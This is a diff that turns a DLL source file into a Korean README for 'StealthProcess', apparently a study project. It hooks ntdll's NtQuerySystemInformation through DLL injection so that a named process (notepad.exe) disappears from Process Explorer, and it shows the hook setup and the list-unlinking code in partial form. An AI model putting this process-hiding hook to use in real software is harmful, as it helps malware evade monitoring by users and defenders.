@@ -1,82 +1,19 @@
-﻿// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
-#include "pch.h"
+# StealthProcess
+## 세부사항
+|||
+|---|---|
+|개발일자|2024-02-23 ~ 2024-02-27|
+|시스템 OS| Windows 10|
+|개발도구| Visual Studio 2022, winAPI, C|
+|추가도구|Process Explorer|
 
-#pragma comment(linker, "/SECTION:.SHARE,RWS")
-#pragma data_seg(".SHARE")
-TCHAR oriProcName[MAX_PATH] = L"notepad.exe";
-#pragma data_seg()
+## 내용
+DLL Injection을 통해 StealthProcess.dll를 인젝션하여 특정 프로세스를 특정 프로세스에서 숨긴다.  
+StealthProcess.dll(특정 프로세스를 숨기는 역활을 담당) -> Injection -> ProcessExploerer  
 
-#define JMP_COMMAND_PADDING				6
-#define SYSTEM_PROCESS_INFORMATION		0x05
-#define STATUS_SEVERITY_SUCCESS			0x0
-
-typedef BYTE	SYSTEM_INFORMATION_CLASS;
-
-typedef NTSTATUS(*NewQsi)(_In_ BYTE SYSTEM_INFORMATION_CLASS, _In_ _Out_ void* sysInfo, _In_ ULONG sysInfoLen, _Out_ ULONG* retLen);
-
-void ErrorMessage(const char* msg);
-void test();
-void Hooking(const char* dllName, const char* srcProc, const void* buffer, int bufferSize);
-NTSTATUS NewQuerySystemInformation(_In_ SYSTEM_INFORMATION_CLASS sysInfoClass, _In_ _Out_ void* sysInfo, _In_ ULONG sysInfoLen, _Out_ ULONG* retLen);
-
-
-int result = 0;
-
-HMODULE myHandle = NULL, gNtdll = NULL;
-void* gProcAddr = NULL;
-wchar_t fileName[MAX_PATH] = { 0, };
-
-BYTE* gOriBuffer = NULL, * gBuffer  = NULL;
-int gOriSize = 0, gBufferSize = 0;
-
-
-BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD  ul_reason_for_call,
-	LPVOID lpReserved
-)
-{
-	wchar_t* tempFileName = NULL;
-
-	BYTE jmpCode[JMP_COMMAND_PADDING] = { 0xff, 0x25, 0, };
-	DWORD64 offsetAddr = (DWORD64)NewQuerySystemInformation;
-	int totalSize =	 gBufferSize = JMP_COMMAND_PADDING + sizeof(offsetAddr);
-	gBuffer = new BYTE[totalSize];
-	memcpy_s(gBuffer, JMP_COMMAND_PADDING, jmpCode, JMP_COMMAND_PADDING);
-	memcpy_s(&gBuffer[JMP_COMMAND_PADDING], sizeof(DWORD64), &offsetAddr, sizeof(DWORD64));
-
-	switch (ul_reason_for_call)
-	{
-		
-
-	case DLL_PROCESS_ATTACH:
-		myHandle = GetModuleHandle(NULL);
-		if (myHandle == NULL) ErrorMessage("myHandle");
-
-		result = GetModuleFileName(myHandle, fileName, MAX_PATH);
-		if (result == 0) ErrorMessage("fileName");
-
-		tempFileName = wcsrchr(fileName, '\\');
-		if (tempFileName == NULL) ErrorMessage("tempFileName");
-		
-		result = wcscmp(tempFileName + 1, fileName);
-		if (result == 0) return TRUE;
-
-		Hooking("ntdll.dll", "NtQuerySystemInformation", gBuffer, gBufferSize);
-
-		break;
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
-	}
-	return TRUE;
-}
-
-void ErrorMessage(const char* msg) {
-	MessageBoxA(NULL, msg, "ERROR", NULL);
-	ExitProcess(1);
-};
-
+## 주요 코드
+### Hooking 함수
+```C
 void Hooking(const char* dllName, const char* srcProc, const void* buffer, int bufferSize) {
 	HMODULE dll = GetModuleHandleA(dllName);
 	if (dll == NULL) ErrorMessage("dll");
@@ -115,7 +52,12 @@ void Hooking(const char* dllName, const char* srcProc, const void* buffer, int b
 	result = VirtualProtect(proc, bufferSize, oldProtect, &oldProtect);
 	if (!result) ErrorMessage("VirtualProtect");
 };
+```
+전달된 매개변수로 원래 함수 위치를 찾아, 전달된 버퍼로 덮어 씌우는 함수이다.  
+실제로 ntdll.dll 에서 NtQuerySystiemInformation 함수를 찾아서, 새로운 함수로 덮어씌운다.
 
+### NewQuerySystemInformation 함수
+```C
 NTSTATUS NewQuerySystemInformation(_In_ SYSTEM_INFORMATION_CLASS sysInfoClass, _In_ _Out_ void* sysInfo, _In_ ULONG sysInfoLen, _Out_ ULONG* retLen) {
 
 	//MessageBoxA(NULL, "Check Function Call", "NewQsi", NULL);
@@ -170,17 +112,18 @@ __NEWQSI_END:
 	Hooking("ntdll.dll", "ZwQuerySystemInformation", gBuffer, gBufferSize);
 	return status;
 };
+```
 
-#ifndef __cplusplus
-extern "C" {
-#endif
-	__declspec(dllexport) void SetProcName(TCHAR* procName) {
-		wcscpy_s(oriProcName, procName);
-	};
+NewQuerySystemInformation 함수에서 눈여겨 볼 곳은 pPrev-NextEntryOffset += pCur->NetxEntryOffset; 이다.  
+NtQuerySystemInformation 에서 ProcessInformation은 리스트 형식에 반환 값을 가지고 있고, 리스트의 구조에서 자신이 숨기고자한 프로세스(oriProcName변수)를 찾아서 리스트 연결을 인젝션을 당한 프로세스에서 내에서 빼는 것이다.
 
-	__declspec(dllexport) TCHAR* GetProcName() {
-		return oriProcName;
-	};
-#ifndef __cplusplus
-};
-#endif
+## 검증
+
+### ProcessExploerer 통해 notepad.exe 확인
+<image src="./검증1.png">
+
+### DLLInjector 로 StealthProcess.dll 인젝션
+<image src="./검증2.png">
+
+### ProcessExploerer 통해 notepad.exe가 사라진것을 확인
+![alt text](image.png)
